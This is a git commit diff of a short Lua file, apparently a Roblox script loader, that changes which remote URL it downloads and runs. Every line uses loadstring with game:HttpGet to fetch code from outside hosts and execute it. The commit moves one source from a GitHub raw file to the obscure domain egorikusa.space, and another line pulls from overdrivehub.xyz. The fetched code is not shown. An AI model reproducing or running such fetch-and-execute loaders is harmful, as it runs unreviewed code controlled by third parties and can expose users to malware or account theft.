8f760282cb9c9f97f165e84b455eefbd1b313a4c
elfandtears <poo23838+alt1@gmail.com>
2025-01-29 19:12:02 -0700

    Update dauthscriptfull.lua

--- dauthscriptfull.lua
+++ dauthscriptfull.lua
@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/639aa5bdc6b3b527051de96d.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/fe9ece2d5cf423063ef98b16.lua", true))()
 loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()
